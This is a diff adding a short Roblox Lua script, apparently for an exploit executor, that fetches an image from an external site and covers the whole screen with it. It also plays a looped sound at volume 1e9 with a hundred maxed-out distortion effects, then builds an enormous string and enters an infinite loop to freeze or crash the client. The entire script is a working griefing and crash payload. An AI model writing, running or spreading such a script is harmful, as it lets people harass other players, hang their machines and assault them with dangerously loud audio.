@@ -1,0 +1,44 @@
+local function GetAssetFromLink(link)
+  local success, response = pcall(function()
+ return game:HttpGet(link)
+   end)
+   
+   if success then
+local Icon = "Image.png"
+writefile(Icon, response)
+return getcustomasset(Icon)
+  else
+return "rbxassetid://0"
+   end
+end
+
+local asset = GetAssetFromLink("https://i.ibb.co/3mwS9XVK/Screenshot-20250406-220813-2.png")
+local scr = Instance.new("ScreenGui", gethui())
+scr.ResetOnSpawn = false
+scr.IgnoreGuiInset = true
+scr.DisplayOrder = math.huge
+
+local img = Instance.new("ImageLabel", scr)
+img.Position = UDim2.new(0, 0, 0, 0)
+img.Size = UDim2.new(1, 0, 1, 0)
+img.Image = asset
+
+local sound = Instance.new("Sound", workspace)
+sound.SoundId = "rbxassetid://7027640335"
+sound.Volume = 1e9
+sound.PlaybackSpeed = 0.9
+sound.Looped = true
+sound:Play()
+
+task.delay(0.5, function()
+ game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+ local LZt = Instance.new("LocalizationTable", game:GetService("LocalizationService"))
+ LZt:SetEntries({{Key = "0x1", Source = "Execute", Values = {["en-us"] = string.rep("Bbbbbbbb", 1e8)}}})
+ while true do end
+end)
+
+for i = 1, 100 do
+  local effect = Instance.new("DistortionSoundEffect", sound)
+  effect.Level = math.huge
+  effect.Priority = math.huge
+end
